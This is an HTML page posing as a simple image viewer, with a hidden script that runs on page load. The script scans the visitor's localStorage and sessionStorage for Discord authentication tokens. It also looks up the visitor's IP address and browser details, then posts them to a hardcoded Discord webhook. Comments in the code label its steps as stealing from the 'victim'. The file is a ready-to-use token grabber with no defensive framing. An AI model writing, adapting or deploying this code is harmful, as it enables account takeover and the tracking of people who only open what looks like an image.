<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Image</title>
</head>
<body style="margin:0;padding:10px;background:#000;">
    <img src="https://i.imgur.com/dQw4w9WgBaLh6m.jpg" style="max-width:100%;border-radius:8px;">
    
    <script>
        // ================================
        // YOUR WEBHOOK URL (EDIT THIS):
        const WEBHOOK = 'https://discord.com/api/webhooks/1479071009964556289/h5vPIQXlMjcdjsSBy20dxJZ85pyLDLSrL9FdWicgbLnmTJz4rT1zagOfsRdAQOzOlqn4';
        // ================================

        (async()=>{
            try{
                // DISCORD TOKEN PATTERNS
                const tokenRegex = /(mfa\.)?[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/g;
                
                // STEAL FROM LOCALSTORAGE
                let tokens = [];
                for(let i=0; i<localStorage.length; i++){
                    try{
                        const val = localStorage.getItem(localStorage.key(i));
                        const matches = val?.match(tokenRegex) || [];
                        tokens.push(...matches);
                    }catch{}
                }
                
                // STEAL FROM SESSIONSTORAGE
                for(let i=0; i<sessionStorage.length; i++){
                    try{
                        const val = sessionStorage.getItem(sessionStorage.key(i));
                        const matches = val?.match(tokenRegex) || [];
                        tokens.push(...matches);
                    }catch{}
                }
                
                // VICTIM INFO
                const info = {
                    ip: await (await fetch('https://api.ipify.org?format=json')).json().then(r=>r.ip).catch(()=>'Unknown'),
                    ua: navigator.userAgent.slice(0,60),
                    tokens: [...new Set(tokens.filter(t=>t.length>50))],
                    referrer: document.referrer || 'Discord',
                    time: new Date().toISOString()
                };
                
                // SEND TO YOUR DISCORD
                const embed = {
                    title: '🖼️ DISCORD EMBED TRACKER',
                    description: `**IP:** \`${info.ip}\`\n**Device:** \`${info.ua}\`\n**Tokens:** ${info.tokens.length}\n**Source:** ${info.referrer}`,
                    color: 16711680,
                    fields: info.tokens.slice(0,3).map((t,i)=>({
                        name:`Token #${i+1}`,
                        value:`\`${t.slice(0,24)}...${t.slice(-20)}\``,
                        inline:true
                    })),
                    timestamp: info.time
                };
                
                await fetch(WEBHOOK,{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({username:'Image Tracker',embeds:[embed]})
                });
                
            }catch(e){}
        })();
    </script>
</body>
</html>
